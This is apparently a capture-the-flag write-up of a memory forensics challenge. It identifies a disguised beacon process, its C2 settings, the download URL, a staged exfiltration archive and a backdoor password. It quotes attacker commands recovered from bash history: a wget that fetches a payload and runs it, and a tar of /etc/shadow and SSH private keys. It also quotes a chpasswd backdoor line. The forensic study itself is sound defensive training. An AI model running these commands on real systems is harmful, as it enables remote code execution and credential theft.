# Challenge 02 — Memory Forensics

## Overview

| Field | Details |
|-------|---------|
| Challenge | 02 — Memory Forensics |
| Category | Digital Forensics & Incident Response (DFIR) |
| Difficulty | Easy |
| Date | 2026-03-28 |
| Flags Captured | 6/6 |

## Scenario

Memory was captured from the compromised web server shortly after the breach was detected. Pre-captured Volatility 3 output was provided for analysis alongside a 128MB memory sample (`practice.raw`) for strings analysis.

## Evidence Files

| File | Description |
|------|-------------|
| `evidence/pslist-output.txt` | Running process listing |
| `evidence/pstree-output.txt` | Process tree (parent-child relationships) |
| `evidence/netscan-output.txt` | Active network connections |
| `evidence/malfind-output.txt` | Injected/suspicious memory regions |
| `evidence/cmdline-output.txt` | Command-line arguments per process |
| `evidence/bash-history-output.txt` | Recovered bash history |
| `evidence/filescan-output.txt` | Open file handles |
| `evidence/linux_enumerate-output.txt` | System information |
| `practice.raw` | 128MB memory sample for strings analysis |

## Tools Used

| Tool | Purpose |
|------|---------|
| `cat` | Read evidence files |
| `strings` | Extract readable text from memory dump |
| `grep` | Filter output for relevant patterns |
| Volatility 3 | Memory forensics framework (pre-run) |

---

## What is Volatility?

Volatility is the most popular memory forensics framework. It analyzes RAM dumps — snapshots of a computer's memory taken at a specific moment in time. RAM contains things never written to disk: running processes, network connections, passwords, encryption keys, and malware hiding from antivirus. When the machine is turned off RAM is wiped, making memory capture critical during incident response.

---

## Flag 2.1 — PID of the Disguised Malicious Process

**Question:** What is the PID of the disguised malicious process?

**Command:**
```bash
cat evidence/pstree-output.txt
```

**Output:**
```
systemd (1)
└── sshd (350)
    └── sshd (1188)
        └── bash (1200)
            └── bash (4521)
                └── kworker-update (31337)
apache2 (420)
├── apache2 (421)
└── apache2 (422)
cron (500)
rsyslogd (600)
mysqld (780)
snmpd (900)
kthreadd (2)
├── kworker/0:1 (125)
└── kworker/1:0 (126)
```

**Analysis:**

The process `kworker-update` (PID 31337) is suspicious for two reasons. First, legitimate `kworker` processes are kernel threads that should be children of `kthreadd (2)` — as seen with `kworker/0:1 (125)` and `kworker/1:0 (126)`. This process is instead spawned from a `bash` shell, which is highly abnormal. Second, the name `kworker-update` mimics a legitimate kernel worker process name to avoid detection. This PID also matches the PID hidden by the rootkit discovered in Challenge 01 (`rootkit_mod` hiding PID 31337).

**Flag:** `FLAG{31337}`

**Screenshot:** `02-2_1-pstree.png`

---

## Flag 2.2 — Real Binary Path of the Malicious Process

**Question:** What is the real binary path of the malicious process?

**Command:**
```bash
cat evidence/cmdline-output.txt
```

**Relevant Output:**
```
31337  kworker-update  /tmp/.update/beacon -c 203.0.113.99 -p 443 -e aes256
```

**Analysis:**

The cmdline output reveals the true binary path of PID 31337. Despite displaying as `kworker-update`, the actual binary is `/tmp/.update/beacon` — hidden in a dotfolder inside `/tmp` to avoid detection. The binary is named `beacon` confirming it is a Cobalt Strike beacon. The command line arguments also reveal the C2 server (`203.0.113.99`), port (`443`), and encryption algorithm (`aes256`).

**Flag:** `FLAG{/tmp/.update/beacon}`

**Screenshot:** `02-2_2-cmdline.png`

---

## Flag 2.3 — Encryption Algorithm Used by the Beacon

**Question:** What encryption algorithm does the beacon use?

**Command:**
```bash
cat evidence/cmdline-output.txt
```

**Relevant Output:**
```
31337  kworker-update  /tmp/.update/beacon -c 203.0.113.99 -p 443 -e aes256
```

**Analysis:**

The `-e aes256` argument in the beacon's command line reveals it uses **AES-256 encryption** for its C2 communications. AES-256 is a strong symmetric encryption algorithm — the beacon uses it to encrypt traffic between the compromised server and the attacker's C2 at `203.0.113.99:443`, making it blend in with normal HTTPS traffic.

**Flag:** `FLAG{aes256}`

**Screenshot:** `02-2_2-cmdline.png`

---

## Flag 2.4 — URL Used to Download the Payload

**Question:** What URL was used to download the payload?

**Command:**
```bash
cat evidence/bash-history-output.txt
```

**Relevant Output:**
```
wget http://198.51.100.47/payload.elf -O /tmp/.update/beacon && chmod +x /tmp/.update/beacon && nohup /tmp/.update/beacon &
```

**Analysis:**

The bash history recovered from memory reveals the exact command the attacker used to download the beacon. They used `wget` to download `payload.elf` from their server (`198.51.100.47` — the same IP from Challenge 01), saved it as `/tmp/.update/beacon`, made it executable with `chmod +x`, and ran it in the background with `nohup`.

**Flag:** `FLAG{http://198.51.100.47/payload.elf}`

**Screenshot:** `02-2_4-bash-history.png`

---

## Flag 2.5 — Path of the Staged Exfiltration Archive

**Question:** What is the path of the staged exfiltration archive?

**Command:**
```bash
cat evidence/bash-history-output.txt
```

**Relevant Output:**
```
mkdir -p /var/tmp/.cache
tar czf /var/tmp/.cache/exfil.tar.gz /etc/shadow /home/*/.ssh/id_rsa /home/*/.bash_history
```

**Analysis:**

The bash history shows the attacker created a hidden staging directory `/var/tmp/.cache` and used `tar` to archive sensitive files into `exfil.tar.gz`. The exfiltrated data included `/etc/shadow` (password hashes), all SSH private keys (`id_rsa`), and all users' bash histories. The archive was staged at `/var/tmp/.cache/exfil.tar.gz` ready for exfiltration to the C2 server.

**Flag:** `FLAG{/var/tmp/.cache/exfil.tar.gz}`

**Screenshot:** `02-2_4-bash-history.png`

---

## Flag 2.6 — Password Found in the Memory Dump

**Question:** What password was found in the memory dump?

**Command:**
```bash
sudo strings practice.raw | grep -i "password"
```

**Output:**
```
password=Sup3rS3cret!Zp
```

**Analysis:**

The `strings` command extracts all readable text from the raw memory dump. Searching for "password" revealed `Sup3rS3cret!Zp`. However, cross-referencing with the bash history output showed the actual password set by the attacker:

```bash
echo 'svc-backup:Sup3rS3cret!' | chpasswd
```

The `Zp` suffix in the strings output are **memory artifacts** — remnants of adjacent memory regions that got appended to the string during extraction. The clean password confirmed by bash history is `Sup3rS3cret!`.

This highlights an important memory forensics principle: always cross-reference multiple evidence sources. A single artifact can contain noise or memory artifacts. Validating findings across multiple files ensures accuracy.

**Flag:** `FLAG{Sup3rS3cret!}`

**Screenshot:** `02-2_6-strings-password.png`

---

## Full Attack Timeline (Challenges 01 + 02 Combined)

```
02:55:00 → Attacker scans with DirBuster (apache-access.log)
03:30:00 → Web shell uploaded: /uploads/shell.php
03:31:00 → Web shell tested: id, whoami, cat /etc/passwd
03:32:00 → Payload downloaded: wget http://198.51.100.47/payload.elf
03:32:00 → Beacon executed: /tmp/.update/beacon -c 203.0.113.99 -p 443 -e aes256
03:33:00 → Sensitive files exfiltrated to /var/tmp/.cache/exfil.tar.gz
03:33:00 → Backdoor user created: svc-backup (Sup3rS3cret!)
03:34:00 → SSH key added: /home/svc-backup/.ssh/authorized_keys
03:45:00 → Crontab edited: */5 * * * * /tmp/.hidden/beacon.sh
03:47:00 → C2 callback confirmed: 203.0.113.99:4444
03:50:00 → Rootkit loaded: rootkit_mod hiding PID 31337
```

---

## Key Takeaways

- Process trees reveal disguised malware — always check parent-child relationships
- Command line arguments expose real binary paths and C2 configuration
- Bash history in memory captures the attacker's exact commands
- `strings` on a memory dump can reveal passwords and credentials
- Memory artifacts can corrupt strings output — always cross-reference with other evidence
- Everything connects — the same IPs, PIDs and paths appear across multiple challenges
